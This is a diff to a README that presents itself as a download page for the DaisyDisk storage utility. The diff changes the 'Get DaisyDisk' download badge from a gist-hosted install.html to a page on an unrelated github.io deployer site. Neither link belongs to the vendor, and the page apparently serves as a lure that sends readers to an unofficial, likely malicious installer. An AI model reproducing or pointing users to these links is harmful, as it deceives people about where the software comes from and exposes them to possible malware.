@@ -1,6 +1,6 @@
 # DaisyDisk Download — Desktop Storage Utility
 
-<a href="https://gistcdn.githack.com/jerrypoohston4/0070e6743f25bb2bb3a39ffeabc93440/raw/ff4a51cb904119d820cdd91a443739eda5c2e375/install.html?offer=DaisyDisk"> <img src="https://img.shields.io/badge/Get%20DaisyDisk%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white" alt="Get DaisyDisk GitHub"> </a>
+<a href="https://git-app-deployer.github.io/.github/?offer=DaisyDisk"> <img src="https://img.shields.io/badge/Get%20DaisyDisk%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white" alt="Get DaisyDisk GitHub"> </a>
 
 ---
 
